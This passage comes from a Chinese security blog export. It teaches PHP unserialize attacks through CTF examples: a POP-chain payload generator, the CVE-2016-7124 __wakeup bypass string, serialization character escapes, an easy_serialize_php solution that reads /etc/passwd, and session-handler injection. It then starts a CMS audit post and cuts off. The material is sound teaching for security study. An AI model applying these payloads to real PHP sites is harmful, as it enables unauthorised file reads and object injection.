<span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">                <span class="variable">$s1</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结一下，pop链如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">start_gg-&gt;__destruct();</span><br><span class="line">Call-&gt;test1();</span><br><span class="line">funct-&gt;__call();</span><br><span class="line">func-&gt;__invoke();</span><br><span class="line">string1-&gt;__toString();</span><br><span class="line">GetFlag-&gt;get_flag();</span><br></pre></td></tr></table></figure>

<p>这里我们看见我们想要执行的函数是是<code>GetFlag-&gt;get_flag()</code>，我们可以试着倒着推上去</p>
<p>此处POP想要执行<code>GetFlag</code>类的<code>get_flag()</code>方法，可以看见在<code>string1</code>类中的<code>__toString()</code>方法调用了<code>$this-&gt;str1-&gt;get_flag()</code>方法所以我们的<code>$this-&gt;str1</code>可以赋值为<code>GetFlag</code>类来使用这个同名函数</p>
<p>而想要调用到<code>string1</code>类的<code>__toString()</code>方法则需要找到一个成员变量被作为字符串调用的地方，于是我们可以看到<code>func</code>类的<code>__invoke</code>方法，<code>$this-&gt;mod1</code>变量被作为字符串拼接使用了，</p>
<p>而继续寻找可用的调用链我们可以找到<code>funct</code>类的<code>__call</code>方法和<code>Call</code>类的<code>test1</code>方法，而最终通过寻找同名函数的方式可以找到POP链的顶端是<code>start_gg</code>类的析构方法，可以通过对象注入自动调用</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1=<span class="keyword">new</span> Call();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1=<span class="keyword">new</span> funct();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1=<span class="keyword">new</span> func();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1=<span class="keyword">new</span> string1();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1=<span class="keyword">new</span> GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="PHP-wakeup魔术方法绕过"><a href="#PHP-wakeup魔术方法绕过" class="headerlink" title="PHP __wakeup魔术方法绕过"></a>PHP __wakeup魔术方法绕过</h2><p>CVE-2016-7124</p>
<p>可利用的版本：</p>
<p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
<p>内容：当php序列化字符串中对象成员个数大于真实的成员个数时会跳过wakeup方法的执行</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class SoFun&#123; </span><br><span class="line">  protected $file=&#x27;wakeup.php&#x27;;</span><br><span class="line">  function __destruct()&#123; </span><br><span class="line">    if(!empty($this-&gt;file)) &#123;</span><br><span class="line">      if(strchr($this-&gt; file,&quot;\\&quot;)===false &amp;&amp;  strchr($this-&gt;file, &#x27;/&#x27;)===false)</span><br><span class="line">        show_source(dirname (__FILE__).&#x27;/&#x27;.$this -&gt;file);</span><br><span class="line">      else</span><br><span class="line">        die(&#x27;Wrong filename.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  function __wakeup()&#123;</span><br><span class="line">   $this-&gt; file=&#x27;index.php&#x27;;</span><br><span class="line">  &#125; </span><br><span class="line">  public function __toString()</span><br><span class="line">    return &#x27;&#x27; ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     </span><br><span class="line">if (!isset($_GET[&#x27;file&#x27;]))&#123; </span><br><span class="line">  show_source(&#x27;wakeup.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">  $file=base64_decode($_GET[&#x27;file&#x27;]); </span><br><span class="line">  echo unserialize($file); </span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br><span class="line">&lt;!--key in flag.php--&gt;</span><br></pre></td></tr></table></figure>

<p>payload: <code>O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p>base64一下发过去就可以发现绕过了<code>__wakeup()</code>函数</p>
<h2 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h2><p>如果在序列化的字符串中暴力地对反序列化字符串进行简单的字符替换处理，则可能会出现字符逃逸的情况，这个情况有点类似于SQL注入</p>
<p>我们来看一个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/p/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;WW&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;purplet&#x27;</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;10&quot;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$age</span>);</span><br><span class="line">var_dump(serialize(<span class="variable">$user</span>));<span class="comment">//string(37) &quot;a:2:&#123;i:0;s:7:&quot;purplet&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line">var_dump(<span class="variable">$r</span>);<span class="comment">//string(39) &quot;a:2:&#123;i:0;s:7:&quot;WWurWWlet&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$r</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个地方我们强行地把序列化后的字符串直接进行正则替换，将大小写的P替换成两个W，这导致了php在反序列化时读完前面对应的字符以后后面超过长度的部分被推出来了</p>
<p>这个地方我们可以尝试利用字符逃逸把数组里面的age从10替换成我们想要的值</p>
<p>如果我们把部分序列化的字符串放在<code>$username</code>的后面，我们如果想要把<code>&quot;;i:1;s:4:&quot;neko&quot;;&#125;</code>部分全部推出去的话，需要增加相同长度的字符，而<code>&quot;;i:1;s:4:&quot;neko&quot;;&#125;</code>的长度为18，则构造前面的字符串的长度为18</p>
<p>那么情况将会变成这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/p/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;WW&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;purppppppppppppppppplet&quot;;i:1;s:4:&quot;neko&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;10&quot;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$age</span>);</span><br><span class="line">var_dump(serialize(<span class="variable">$user</span>));<span class="comment">//string(72) &quot;a:2:&#123;i:0;s:41:&quot;purppppppppppppppppplet&quot;;i:1;s:4:&quot;neko&quot;;&#125;&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line">var_dump(<span class="variable">$r</span>);<span class="comment">//string(90) &quot;a:2:&#123;i:0;s:41:&quot;WWurWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWlet&quot;;i:1;s:4:&quot;neko&quot;;&#125;&quot;;i:1;s:2:&quot;10&quot;;&#125;&quot;</span></span><br><span class="line">var_dump(unserialize(<span class="variable">$r</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终php将<code>a:2:&#123;i:0;s:41:&quot;WWurWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWlet&quot;;i:1;s:4:&quot;neko&quot;;&#125;</code>作为正常的序列化字符串进行反序列化，而且后面被推出去的部分被php忽略了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">41</span>) <span class="string">&quot;WWurWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWlet&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;neko&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样我们实现了把数组的后面的元素覆盖为我们想要的元素的目的</p>
<p>这种情况是字符增多的，下面我们来看一道CTF真题，是字符减少的情形</p>
<p>[安洵杯 2019]easy_serialize_php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看见这题把序列化后的字符串直接传入了<code>filter()</code>方法，而<code>filter</code>方法中我们可以看见他直接使用了<code>perg_replace</code>方法把’php’,’flag’,’php5’,’php4’,’fl1g’字符串替换为空，而这里反序列化的变量是<code>$_SESSION</code>，我们可以直接通过这题存在的一个<code>extract</code>，参数是<code>$_POST</code>，进行变量覆盖，把<code>$_session</code>变量覆盖为我们想要的值，这样就可以实现参数可控了</p>
<p>这一题我们最终要实现的目的是利用最后的<code>file_get_contents</code>实现任意文件读取，这里我们就可以利用字符逃逸把前面固定赋值的<code>img</code>参数吃掉，然后插入我们想要的参数</p>
<p>payload如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">POST请求</span></span><br><span class="line">_SESSION[a]=phpphpphpphpphp&amp;_SESSION[b]=;s:1:&quot;x&quot;;s:1:&quot;x&quot;;s:3:&quot;img&quot;;s:16:&quot;L2V0Yy9wYXNzd2Q=&quot;;&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash">GET请求</span></span><br><span class="line">?f=show_image</span><br></pre></td></tr></table></figure>

<p>我们来看一下结果</p>
<p>直接序列化的输出是：</p>
<p><code>a:3:&#123;s:1:&quot;a&quot;;s:15:&quot;phpphpphpphpphp&quot;;s:1:&quot;b&quot;;s:52:&quot;;s:1:&quot;x&quot;;s:1:&quot;x&quot;;s:3:&quot;img&quot;;s:16:&quot;L2V0Yy9wYXNzd2Q=&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p>
<p>经过字符串过滤以后：</p>
<p><code>a:3:&#123;s:1:&quot;a&quot;;s:15:&quot;&quot;;s:1:&quot;b&quot;;s:52:&quot;;s:1:&quot;x&quot;;s:1:&quot;x&quot;;s:3:&quot;img&quot;;s:16:&quot;L2V0Yy9wYXNzd2Q=&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p>
<p>这个地方可以看见我在这里构造了5个php总共15个字符，刚好是后面<code>&quot;;s:1:&quot;b&quot;;s:52:</code>的长度</p>
<p>这样一来，原来标识字符串长度为52的那一部分就被吃掉了，而变成了字符串的一部分，而原来字符串的部分则被作为序列化的数据处理了</p>
<p>最终的结果是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;\&quot;;s:1:&quot;</span><span class="string">b&quot;;s:56:&quot;</span></span><br><span class="line">  [<span class="string">&quot;x&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;x&quot;</span></span><br><span class="line">  [<span class="string">&quot;img&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">20</span>) <span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功覆盖到img的值</p>
<h2 id="PHP-session-反序列化漏洞"><a href="#PHP-session-反序列化漏洞" class="headerlink" title="PHP session 反序列化漏洞"></a>PHP session 反序列化漏洞</h2><p>session是一种服务器标识用户的一种手段，php通过给用户分配session_id来表示每一个用户，同时也会在服务器上以文件的形式保存用户的session信息</p>
<p>需要使用session时我们需要使用<code>$_SESSION</code>全局变量，全局变量的内容会根据用户的session_id来命名一个文件，并保存在服务器上，文件名的格式为<code>sess_用户的session_id</code></p>
<p>储存文件的位置可以在phpinfo的<code>session.save_path</code>里看到</p>
<p>php在session存储和读取时，或者是session在初始化的时候会有一个序列化和反序列化的过程，php内置了多种存储引擎用于存取 <code>$_SESSION</code> 数据，都会对数据进行序列化和反序列化</p>
<p>以下展示三种不同的存储引擎的存储方式：</p>
<table>
<thead>
<tr>
<th>存储引擎名称</th>
<th>存储结构</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名|序列化以后的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度（对应的ascii字符）+键名+serialize()处理的数据</td>
</tr>
<tr>
<td>php_serialize</td>
<td>serialize()以后的数据</td>
</tr>
</tbody></table>
<p>这些储存引擎可以在<code>php.ini</code>来配置，配置的键名是<code>session.serialize_handler</code></p>
<p>当在同时使用两种不同的引擎的时候，就有可能可以触发反序列化</p>
<p>写一个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;w4&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//2.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里代码来自y4师傅的博客，我自己稍微修改了一下</p>
<p>可以看见这个地方传入一个<code>a=w4rsp1t3</code></p>
<p>可以看到已经有session文件生成了，内容是：<code>a:1:&#123;s:2:&quot;w4&quot;;s:8:&quot;w4rsp1t3&quot;;&#125;</code></p>
<p>如果访问<code>2.php</code>会发现session变量什么都没有，因为<code>2.php</code>的存储引擎和<code>1.php</code>的不相同，解析失败，而如果我们在<code>1.php</code>前面传入反序列化的payload，并且在前面加一个管道符，如下：</p>
<p><code>|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;w4rsp1t3&quot;;&#125;</code></p>
<p>传入以后session文件如下：</p>
<p><code>a:1:&#123;s:2:&quot;w4&quot;;s:42:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;w4rsp1t3&quot;;&#125;&quot;;&#125;</code></p>
<p>这个时候访问<code>2.php</code>，在<code>session_start()</code>执行时，php引擎就会自动把后面那一串作为session的数据进行反序列化，这个时候就会触发代码的<code>__wakeup()</code>方法</p>
<h2 id="phar触发的反序列化"><a href="#phar触发的反序列化" class="headerlink" title="phar触发的反序列化"></a>phar触发的反序列化</h2><p>有些时候环境里面没有反序列化入口点，我们这里就可以寻找可以使用<code>phar://</code>协议的地方来配合文件上传等漏洞来进行反序列化</p>
]]></content>
      <categories>
        <category>php</category>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>一次简单的代码审计</title>
    <url>/2022/01/26/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="起因：（大佬勿喷哈，我是真的菜）"><a href="#起因：（大佬勿喷哈，我是真的菜）" class="headerlink" title="起因：（大佬勿喷哈，我是真的菜）"></a>起因：（大佬勿喷哈，我是真的菜）</h2><h6 id="是这样的，起因是一个同班同学接了个搭建网站的单子，问我会不会搭建，我说会，然后又说得我自己来写前后端，想了想，还是拿网上的一些cms直接搭建来的快"><a href="#是这样的，起因是一个同班同学接了个搭建网站的单子，问我会不会搭建，我说会，然后又说得我自己来写前后端，想了想，还是拿网上的一些cms直接搭建来的快" class="headerlink" title="是这样的，起因是一个同班同学接了个搭建网站的单子，问我会不会搭建，我说会，然后又说得我自己来写前后端，想了想，还是拿网上的一些cms直接搭建来的快"></a>是这样的，起因是一个同班同学接了个搭建网站的单子，问我会不会搭建，我说会，然后又说得我自己来写前后端，想了想，还是拿网上的一些cms直接搭建来的快</h6><p><img src="https://ae01.alicdn.com/kf/Hc2e9ce028fc1412aae74077c07442392y.png"></p>
<h6 id="然后就在网上找源码的时候看到一个cms，网上搜了下还没有人审计过，比较小众的一个cms，很适合练手"><a href="#然后就在网上找源码的时候看到一个cms，网上搜了下还没有人审计过，比较小众的一个cms，很适合练手" class="headerlink" title="然后就在网上找源码的时候看到一个cms，网上搜了下还没有人审计过，比较小众的一个cms，很适合练手"></a>然后就在网上找源码的时候看到一个cms，网上搜了下还没有人审计过，比较小众的一个cms，很适合练手</h6><h4 id="这是源码的一个目录结构："><a href="#这是源码的一个目录结构：" class="headerlink" title="这是源码的一个目录结构："></a>这是源码的一个目录结构：</h4><img src="https://ae01.alicdn.com/kf/H522d065b3b8c42599d1bc3e565c383f1r.png" style="zoom:200%;" />

<h4 id="开始审计之路："><a href="#开始审计之路：" class="headerlink" title="开始审计之路："></a>开始审计之路：</h4><h5 id="第一肯定是审计前台的洞啦，先审计前台的xss和sql注入"><a href="#第一肯定是审计前台的洞啦，先审计前台的xss和sql注入" class="headerlink" title="第一肯定是审计前台的洞啦，先审计前台的xss和sql注入"></a>第一肯定是审计前台的洞啦，先审计前台的xss和sql注入</h5><h6 id="改源码将GET，POST的请求统一写入了一个函数进行内容的过滤，不然就是使用intval函数取整数值来进行sql和xss的过滤"><a href="#改源码将GET，POST的请求统一写入了一个函数进行内容的过滤，不然就是使用intval函数取整数值来进行sql和xss的过滤" class="headerlink" title="改源码将GET，POST的请求统一写入了一个函数进行内容的过滤，不然就是使用intval函数取整数值来进行sql和xss的过滤"></a>改源码将GET，POST的请求统一写入了一个函数进行内容的过滤，不然就是使用intval函数取整数值来进行sql和xss的过滤</h6><p><img src="https://ae01.alicdn.com/kf/H016c89b3bc8e41f7a984452a6772c986h.png"></p>
<p><img src="https://ae01.alicdn.com/kf/Hcdc2b99f6cae4886bfe035d6ecd1d0b7f.png"></p>
